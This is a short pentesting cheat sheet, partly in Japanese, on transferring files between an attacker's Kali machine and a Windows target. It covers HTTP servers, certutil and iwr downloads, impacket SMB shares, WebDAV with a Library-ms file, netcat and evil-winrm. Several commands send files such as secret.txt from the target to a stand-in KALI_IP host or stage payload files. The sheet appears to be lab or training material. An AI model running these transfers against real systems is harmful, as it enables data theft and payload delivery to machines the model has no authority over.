## SCP

## HTTP

apache web server  

python web server  
カレントディレクトリのファイルをリモート側でダウンロードさせる  
```
python3 -m http.server
```

download command  
powershell
```
iwr -Uri "URL" -OutFile "保存先のファイルパス"
```

cmd prompt
```
certutil -urlcache -split -f URL OUTPUTFILE
```
## SMB
### setup
server (linux)
```
impacket-smbserver test . -smb2support  -username kourosh -password kourosh
```

client (windows)
```
net use m: \\KALI_IP\test /user:kourosh kourosh
```
### upload
cmd
```
copy C:\Users\user\Desktop\payload.zip m:\
```

powershell
```
Copy-Item -Path "C:\Users\user\Desktop\payload.zip" -Destination "m:\"
```

### download
cmd
```
copy m:\secret.txt C:\Users\Public\
```

powershell
```
Copy-Item -Path "m:\secret.txt" -Destination "C:\Users\Public\"
```
## webdav
server(kali)
```
wsgidav --host=0.0.0.0 --port=80 --auth=anonymous --root `pwd`
```

client(windows)
execute config.Library-ms
```Library-ms
<?xml version="1.0" encoding="UTF-8"?>
<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
<name>@windows.storage.dll,-34582</name>
<version>6</version>
<isLibraryPinned>true</isLibraryPinned>
<iconReference>imageres.dll,-1003</iconReference>
<templateInfo>
<folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType>
</templateInfo>
<searchConnectorDescriptionList>
<searchConnectorDescription>
<isDefaultSaveLocation>true</isDefaultSaveLocation>
<isSupported>false</isSupported>
<simpleLocation>
<url>http://192.168.x.x</url>
</simpleLocation>
</searchConnectorDescription>
</searchConnectorDescriptionList>
</libraryDescription>
```

# Netcat
### kali -> windows
listener (linux)
```
nc -nvlp 9999 < file.txt
```

client (windows)
cmd.exe
```
C:\Tools\nc.exe -nv KALI_IP 9999 > file.txt
```

### windows -> kali
listener (kali)
```
nc -nvlp 9999 > file.txt
```

client (windows)
cmd.exe
```
nc.exe -nv KALI_IP 9999 < file.txt
```

powershell
```
Get-Content .\FILE -Encoding Byte -ReadCount 0 | .\nc.exe -nv 192.168.x.x 5555
```
# evil-winrm
download to current local directory
```
download FILEPATH
```

upload to current remote directory
```
upload FILE_PATH
```